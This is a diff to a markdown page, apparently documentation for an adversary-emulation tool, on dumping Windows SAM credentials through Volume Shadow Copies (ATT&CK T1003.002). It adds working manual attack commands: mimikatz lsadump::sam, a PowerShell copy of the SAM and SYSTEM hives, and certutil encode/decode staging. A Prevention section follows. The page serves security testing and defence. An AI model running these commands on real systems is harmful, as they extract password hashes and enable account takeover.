@@ -22,10 +22,15 @@ A vulnerable system will report ```BUILTIN\Users:(I)(RX)```
 ## Attack
 1. Create a new campaign
 2. Select the Compound Action for T1003.002
-3. Note: you may need to change the HarddiskVolumeShadowCopy#
+3. Note: you may need to change the HarddiskVolumeShadowCopy# to the backup available on the disk. You can identify that by using the ```vssadmin list shadows``` command.
 
 ## Manual Attack
 - ```mimikatz "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\system /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\\sam"```
+- ```powershell foreach($i in @("SYSTEM","SAM")){[System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\$i", "$i")}```
+- ```certutil -encode \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\SYSTEM SYSTEM.encoded```
+- ```certutil -decode SYSTEM.encoded SYSTEM.hive```
+- ```certutil -encode \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\SAM SAM.encoded```
+- ```certutil -decode SAM.encoded SAM.hive```
 
 ## Prevention
 Restrict access to sam, system, and security files and remove VSS shadow copies. On a command prompt with administrative privileges:
